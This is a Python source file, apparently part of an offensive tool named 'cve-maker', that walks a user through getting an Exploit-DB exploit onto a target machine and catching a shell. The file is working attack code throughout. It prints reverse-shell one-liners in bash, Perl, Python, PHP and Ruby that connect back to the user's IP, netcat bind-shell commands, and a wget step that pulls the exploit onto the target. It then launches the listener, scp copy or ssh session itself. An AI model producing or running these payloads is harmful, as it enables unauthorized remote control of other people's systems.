#!/usr/bin/env python3

"""
https://github.com/msd0pe-1
Source code put in public domain by msd0pe, no Copyright
Any malicious or illegal activity may be punishable by law
Use at your own risk
"""

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

try:
    import os

except ImportError:
    print(bcolors.RED + bcolors.BOLD + "\nError. Have you installed the requirements properly?" + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.RED + bcolors.BOLD + "Be sure to run the script as follows:\n" + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.OCRA + bcolors.BOLD + "python3 cve-maker.py ...." + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.OCRA + bcolors.BOLD + "./cve-maker.py ...." + bcolors.ENDC + bcolors.ENDC)


def Instructions(name_ext, edb):

    print("")
    print("    1) Type" + bcolors.PURPLE + bcolors.BOLD + " wget https://www.exploit-db.com/raw/" + edb + " -O " + name_ext + bcolors.ENDC + bcolors.ENDC + " on the target")
    print("    Or you can copy and paste the payload which is in" + bcolors.PURPLE + bcolors.BOLD + " /tmp/exploit/" + name_ext + bcolors.ENDC + bcolors.ENDC + " (in your computer) on the target.")
    print("    (Not necessary with SSH !)")
    print("    2) Compile it if it's necessary.")
    print("    3) Launch & Enjoy !" + bcolors.ENDC + bcolors.ENDC)
    print("")
    print("    You can spawn a TTY Shell with : " + bcolors.PURPLE + bcolors.BOLD + "python -c \'import pty; pty.spawn(\"/bin/sh\")\'" + bcolors.ENDC + bcolors.ENDC)
    print(bcolors.BLUE + bcolors.BOLD + "\nWAITING FOR A SHELL...\n" + bcolors.ENDC + bcolors.ENDC)


def BindShell(name_ext, edb):

    ip_target = input(bcolors.OCRA + bcolors.BOLD + "> Enter the IP of the target : " + bcolors.ENDC + bcolors.ENDC)
    port_target = input(bcolors.OCRA + bcolors.BOLD + "> Enter the PORT of the target to open : " + bcolors.ENDC + bcolors.ENDC)

    print("")
    print(bcolors.GREEN + bcolors.BOLD + "Enter one of this command on the target : " + bcolors.ENDC + bcolors.ENDC)
    print("")
    print("    nc -lvp " + port_target + " -e /bin/sh")
    print("    nc -lvp " + port_target + " -e /bin/bash")
    print("")
    ready = input(bcolors.RED + bcolors.BOLD + "Press Enter to continue." + bcolors.ENDC + bcolors.ENDC)

    Instructions(name_ext, edb)
    os.system("nc " + ip_target + " " 	+ port_target)


def ReverseShell(name_ext, edb):

    ip_host = input(bcolors.OCRA + bcolors.BOLD + "> Enter your IP : " + bcolors.ENDC + bcolors.ENDC)
    port_host = input(bcolors.OCRA + bcolors.BOLD + "> Enter your PORT to listen on : " + bcolors.ENDC + bcolors.ENDC)

    print("")
    print(bcolors.GREEN + bcolors.BOLD + "Enter one of this command on the target ! " + bcolors.ENDC + bcolors.ENDC)
    print("")
    print(bcolors.GREEN + bcolors.BOLD + "BASH" + bcolors.ENDC + bcolors.ENDC + " : ")
    print("bash -i >& /dev/tcp/" + ip_host + "/" + port_host + " 0>&1")
    print("")
    print(bcolors.PURPLE + bcolors.BOLD + "PERL" + bcolors.ENDC + bcolors.ENDC + " : ")
    print("perl -e 'use Socket;$i=\"" + ip_host + "\";$p=" + port_host + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
    print("")
    print(bcolors.OCRA + bcolors.BOLD + "PYTHON" + bcolors.ENDC + bcolors.ENDC + " : ")
    print("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip_host + "\"," + port_host + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    print("")
    print(bcolors.BLUE + bcolors.BOLD + "PHP" + bcolors.ENDC + bcolors.ENDC + " : ")
    print("php -r '$sock=fsockopen(\"" + ip_host + "\"," + port_host + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print("")
    print(bcolors.RED + bcolors.BOLD + "RUBY" + bcolors.ENDC + bcolors.ENDC + " : ")
    print("ruby -rsocket -e'f=TCPSocket.open(\"" + ip_host + "\"," + port_host +").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")

    Instructions(name_ext,edb)
    os.system("nc -lvp " + port_host)


def SSH(name_ext, edb):

    ip_target = input(bcolors.OCRA + bcolors.BOLD + "> Enter the IP of the target : " + bcolors.ENDC + bcolors.ENDC)
    username = input(bcolors.OCRA + bcolors.BOLD + "> Enter the username to log in to : " + bcolors.ENDC + bcolors.ENDC)

    print("")
    os.system("scp /tmp/exploit/" + name_ext + " " + username + "@" + ip_target + ":/tmp/")
    print("") 
    print(bcolors.GREEN + bcolors.BOLD + "EXPLOIT COPIED : " + bcolors.ENDC + bcolors.ENDC + "/tmp/" + name_ext + "\n")
    Instructions(name_ext, edb)
    os.system("ssh " + username + "@" + ip_target)


def Menu(remote, payload, name, langage, edb):

    if langage == "sh":
        name_ext = str(name) + ".sh"
    elif langage == "ruby":
        name_ext = str(name) + ".rb"
    elif langage == "perl":
        name_ext = str(name) + ".pl"
    elif langage == "python":
        name_ext = str(name) + ".py"
    elif langage == "php":
        name_ext = str(name) + ".php"
    else:
        name_ext = str(name) + ".c"

    if remote == None:
        pass

    else:
        print("")
        print(bcolors.PURPLE + bcolors.BOLD + "Choose a way to connect to the target : " + bcolors.ENDC + bcolors.ENDC)
        print("    1) Reverse Shell")
        print("    2) Bind Shell")
        print("    3) SSH")
        print("")

        choice = input(bcolors.CYAN + bcolors.BOLD + "> Choice : " + bcolors.ENDC + bcolors.ENDC)
        print("")

        if choice == "1":
            ReverseShell(name_ext, edb)


        elif choice == "2":
            BindShell(name_ext, edb)

        elif choice == "3":
            SSH(name_ext, edb)

        else:
            print(bcolors.RED + bcolors.BOLD + "You must enter a valid choice ! Example: 1, 2 or 3" + bcolors.ENDC + bcolors.ENDC)
            print("")


